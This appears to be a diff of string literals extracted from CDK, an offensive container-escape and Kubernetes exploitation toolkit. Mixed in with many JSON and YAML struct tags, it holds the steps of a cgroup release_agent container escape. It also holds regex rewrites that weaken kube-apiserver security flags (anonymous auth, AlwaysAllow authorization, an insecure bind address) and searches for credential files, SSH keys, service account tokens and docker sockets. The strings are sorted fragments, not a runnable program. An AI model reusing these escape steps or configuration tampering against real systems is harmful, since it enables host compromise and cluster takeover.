@@ -1,0 +1,205 @@
+"` + """
+"`"" + "
+"`""code"":403"
+"`""gitVersion"":.*?""(.*?)"""
+"`""metadata"":{""name"":""(kube-apiserver\b[^""]*?)"""
+"`""namespace"""
+"`${1}""--allow-privileged=true"",${2}"
+"`${1}""--anonymous-auth=true"",${2}"
+"`${1}""--authorization-mode=AlwaysAllow"",${2}"
+"`${1}""--insecure-bind-address=0.0.0.0"",${2}"
+"`${1}""--insecure-port=9443"",${2}"
+"`${1}""--secure-port=9444"",${2}"
+"`("")(--audit-log-[^""]*?)("")"
+"`(""--allow-privileged\s*?=\s*?)(.*?)("")"
+"`(""--anonymous-auth\s*?=\s*?)(.*?)("")"
+"`(""--authorization-mode\s*?=\s*?)(.*?)("")"
+"`(""--insecure-bind-address\s*?=\s*?)(.*?)("")"
+"`(""--insecure-port\s*?=\s*?)(.*?)("")"
+"`(""--secure-port\s*?=\s*?)(.*?)("")"
+"`(^[\s\S]*?""command""[\s\:]*?\[[^\]]*?""kube-apiserver"")([^""]*?)(,\s*?""[\s\S]*?)$"
+"`(^[\s\S]*?)(""--etcd-keyfile=[^""]*?""[\s\S]*?)$"
+"`** to get evaluate info and a recommend exploit, then run **"
+"`dirname ""${current_file}"""
+"`dirname ""${pdir}"""
+"`dirname ""${ppdir}"""
+"`escape privileged container via cgroup. usage: ./cdk run mount-cgroup ""shell-cmd-payloads"" [subsystem-name]"
+"`href=""(.*)"""
+"`href=""pods/"
+"`json:""X-Amzn-Trace-Id"""
+"`json:""X-B3-Sampled"""
+"`json:""X-B3-Spanid"""
+"`json:""X-B3-Traceid"""
+"`json:""X-Envoy-Attempt-Count"""
+"`json:""X-Envoy-Peer-Metadata"""
+"`json:""X-Envoy-Peer-Metadata-Id"""
+"`json:""affinity"""
+"`json:""annotations,omitempty"""
+"`json:""apiVersion"""
+"`json:""blockOwnerDeletion"""
+"`json:""conditions"""
+"`json:""containerID"""
+"`json:""containerPort"""
+"`json:""containerStatuses"""
+"`json:""containers"""
+"`json:""controller"""
+"`json:""creationTimestamp,omitempty"""
+"`json:""dnsPolicy"""
+"`json:""effect"""
+"`json:""env"""
+"`json:""exitCode"""
+"`json:""fieldsType"""
+"`json:""fieldsV1"""
+"`json:""generateName"""
+"`json:""generateName,omitempty"""
+"`json:""headers"""
+"`json:""hostIP"""
+"`json:""hostPort"""
+"`json:""image"""
+"`json:""imageID"""
+"`json:""ip"""
+"`json:""items"""
+"`json:""key"""
+"`json:""kind"""
+"`json:""labels"""
+"`json:""labels,omitempty"""
+"`json:""lastProbeTime"""
+"`json:""lastState"""
+"`json:""lastTransitionTime"""
+"`json:""managedFields"""
+"`json:""manager"""
+"`json:""matchFields"""
+"`json:""metadata"""
+"`json:""name"""
+"`json:""name,omitempty"""
+"`json:""namespace,omitempty"""
+"`json:""nodeAffinity"""
+"`json:""nodeName"""
+"`json:""nodeSelectorTerms"""
+"`json:""operation"""
+"`json:""operator"""
+"`json:""ownerReferences"""
+"`json:""phase"""
+"`json:""podIP"""
+"`json:""podIPs"""
+"`json:""ports"""
+"`json:""protocol"""
+"`json:""qosClass"""
+"`json:""ready"""
+"`json:""reason"""
+"`json:""requiredDuringSchedulingIgnoredDuringExecution"""
+"`json:""resourceVersion,omitempty"""
+"`json:""resources"""
+"`json:""restartCount"""
+"`json:""restartPolicy"""
+"`json:""running,omitempty"""
+"`json:""schedulerName"""
+"`json:""securityContext"""
+"`json:""serviceAccountName"""
+"`json:""spec"""
+"`json:""startTime"""
+"`json:""started"""
+"`json:""startedAt"""
+"`json:""state"""
+"`json:""status"""
+"`json:""sysctls"""
+"`json:""terminated,omitempty"""
+"`json:""terminationGracePeriodSeconds"""
+"`json:""time"""
+"`json:""tolerationSeconds,omitempty"""
+"`json:""tolerations"""
+"`json:""type"""
+"`json:""uid"""
+"`json:""uid,omitempty"""
+"`json:""value"""
+"`json:""values"""
+"`json:""waiting,omitempty"""
+"`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab"
+"`var lib.Args[""<args>""]"
+"`yaml:""apiVersion"""
+"`yaml:""certificate-authority-data"""
+"`yaml:""client-certificate-data"""
+"`yaml:""client-key-data"""
+"`yaml:""cluster"""
+"`yaml:""clusters"""
+"`yaml:""command,omitempty"""
+"`yaml:""containerPort"""
+"`yaml:""containers"""
+"`yaml:""context"""
+"`yaml:""contexts"""
+"`yaml:""current-context"""
+"`yaml:""image"""
+"`yaml:""kind"""
+"`yaml:""labels,omitempty"""
+"`yaml:""metadata"""
+"`yaml:""name"""
+"`yaml:""namespace,omitempty"""
+"`yaml:""ports,omitempty"""
+"`yaml:""preferences"""
+"`yaml:""server"""
+"`yaml:""spec"""
+"`yaml:""user"""
+"`yaml:""users"""
+` 
+` and 
+` export host_path=
+` for host_path: 
+` mounted to 
+` mounted to container 
+` or 
+`${host_path}/exp.sh
+`%s
+`(?i)capeff:\s*?[a-z0-9]+\s
+`--full
+`--security-opt seccomp=unconfined --security-opt apparmor=unconfined
+`./cdk eva --full
+`./cdk kcurl
+`./cdk run
+`./cdk run lxcfs-rw
+`./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads
+`./cdk run mount-disk
+`./cdk ucurl
+`.dockerenv
+`.git/
+`.kube/
+`.pip/
+`.svn/
+`.token
+`/
+`/.bash_history
+`/.bash_profile
+`/.bashrc
+`/.ssh/
+`/config.json
+`/containerd.sock
+`/containerd/s/
+`/dev/mapper/[^/ ]+-([0-9a-fA-F]+) 
+`/docker.sock
+`/etc/mtab
+`/host
+`/proc/self/cgroup
+`/serviceaccount
+`CDK (Container DucK)
+`GreenBold.Sprint(str)
+`\@/containerd-shim/[\w\d\/-]*?\.sock
+``
+`cdk eva
+`cdk run
+`chmod +x /exp.sh
+`curl
+`echo ${host_path}/exp.sh > /mnt/cgrp1/release_agent
+`echo 1 > /mnt/cgrp1/x/notify_on_release
+`export GOTRACEBACK=crash
+`fdisk
+`find /bin/. -perm -4000 -type f 
+`go build
+`ln -s targetfile /var/log/targetfile
+`mkdir -p /mnt/cgrp1
+`mkdir -p /mnt/cgrp1/x
+`mount -t cgroup -o rdma cgroup /mnt/cgrp1
+`sysctl -w kernel.unprivileged_userns_clone=1
+`uname -r
+`unshare
+`unshare -UrmC bash
+`wget
+`workdir=((/[^/ ]+)+)/work
